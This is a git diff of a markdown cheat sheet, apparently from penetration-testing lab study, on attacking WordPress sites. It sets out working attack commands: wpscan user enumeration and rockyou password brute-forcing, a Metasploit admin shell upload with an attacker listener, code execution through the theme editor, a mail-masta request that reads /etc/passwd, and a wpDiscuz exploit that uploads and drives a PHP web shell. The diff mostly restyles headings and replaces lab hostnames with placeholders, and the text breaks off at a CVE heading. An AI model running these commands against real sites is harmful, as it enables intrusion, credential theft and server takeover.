@@ -1,4 +1,4 @@
-### General Information :
+### <span style="color:#50FA7B">General Information :</span>
 ```bash
 # Identify Theme:
 curl -s http://target.com | grep themes
@@ -10,11 +10,11 @@ curl -s http://target.com | grep plugins
 # Sometimes you can access: http://target.com/wp-content/plugins/plugin-name/readme.txt
 ```
 
-## WPscan
+## <span style="color:#8BE9FD">WPscan</span>
 
 ```bash
-# Enumerate users on the WordPress site at http://10.10.10.10
-wpscan --url http://10.10.10.10 --enumerate u
+# Enumerate users on the WordPress site at http://$VICTIM_IP
+wpscan --url http://$VICTIM_IP --enumerate u
 
 # Enumerate vulnerable plugins on example.com with mixed detection method
 # Using a valid WPScan API token for vulnerability database access
@@ -31,18 +31,18 @@ wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt
 wpscan --url http://target.com --enumerate --api-token YOUR_TOKEN
 ```
 
-## Metasploit Shell Upload
+## <span style="color:#8BE9FD">Metasploit Shell Upload</span>
 ```bash
 use exploit/unix/webapp/wp_admin_shell_upload
 set username john
 set password firebird1
-set lhost <your_ip>
-set rhost <target_ip>
-set vhost blog.inlanefreight.local
+set lhost $ATTACKER_IP
+set rhost $VICTIM_IP
+set vhost blog.$DOMAIN
 exploit
 ```
 
-##  Code Execution via Theme Editor (RCE)
+## <span style="color:#8BE9FD">Code Execution via Theme Editor (RCE)</span>
 - Log in to WordPress
 - Go to Appearance > Theme Editor
 - Select an inactive theme (e.g., Twenty Nineteen)
@@ -56,34 +56,34 @@ This will let us run system commands like id using a GET request.
 - Visit this URL to test:
 
 ```bash
-http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+http://blog.$DOMAIN/wp-content/themes/twentynineteen/404.php?0=id
 ```
 
 
-## Vulnerable Plugins
+## <span style="color:#8BE9FD">Vulnerable Plugins</span>
 
-### `mail-masta`
+### <span style="color:#50FA7B">`mail-masta`</span>
 This plugin has a bug that lets us read any file on the server.
 ```bash
-curl http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+curl http://blog.$DOMAIN/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 ```
 ✅ You can read the /etc/passwd file, which lists system users.
 
-### `wpDiscuz` (Version 7.0.4)
+### <span style="color:#50FA7B">`wpDiscuz` (Version 7.0.4)</span>
 This plugin allows file uploads. But a bug lets us upload a PHP backdoor instead of just images.
 ```bash
-python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+python3 wp_discuz.py -u http://blog.$DOMAIN -p /?p=1
 ```
 If successful, it uploads a PHP shell to:
 ```bash
 /wp-content/uploads/2021/08/<random_name>.php
 
 # You can run commands using:
-curl http://blog.inlanefreight.local/wp-content/uploads/2021/08/<filename>.php?cmd=id
+curl http://blog.$DOMAIN/wp-content/uploads/2021/08/<filename>.php?cmd=id
 ```
 
 
-## CVE-2021-29447 
+## <span style="color:#8BE9FD">CVE-2021-29447</span>
 
 when you logged in to admin panel then you can upload media files but its restricted in wordpress 5.6 version so you can use this exploit 
 
